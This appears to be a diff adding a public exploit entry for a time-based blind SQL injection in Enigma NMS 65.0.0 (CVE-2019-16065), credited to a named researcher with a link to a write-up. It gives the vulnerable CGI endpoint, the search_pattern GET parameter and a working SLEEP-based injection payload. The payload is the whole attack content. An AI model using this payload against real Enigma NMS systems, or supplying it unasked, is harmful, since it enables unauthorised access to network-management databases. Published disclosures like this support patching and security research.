@@ -1,0 +1,23 @@
+#--------------------------------------------------------------------#
+# Exploit Title: Enigma NMS search_pattern SQL Injection             #
+# Date:  21 July 2019                                                #
+# Author: Mark Cross (@xerubus | mogozobo.com)                       #
+# Vendor: NETSAS Pty Ltd                                             #
+# Vendor Homepage:  https://www.netsas.com.au/                       #
+# Software Link: https://www.netsas.com.au/enigma-nms-introduction/  #
+# Version: Enigma NMS 65.0.0                                         #
+# CVE-IDs: CVE-2019-16065                                            #
+# Full write-up: https://www.mogozobo.com/?p=3647                    #
+#--------------------------------------------------------------------#
+        _  _
+  ___ (~ )( ~)
+ /   \_\ \/ /   
+|   D_ ]\ \/        -= Enigma SQLi by @xerubus =-    
+|   D _]/\ \     -= We all have something to hide =-
+ \___/ / /\ \\
+      (_ )( _)
+      @Xerubus    
+
+Request: http://<enigma_nms_ipaddr>/cgi-bin/protected/manage_hosts_short.cgi?action=search_proceed&search_pattern=
+Vulnerable Parameter:  search_pattern (GET)
+Payload: action=search_proceed&search_pattern=a%' AND SLEEP(5) AND '%'='
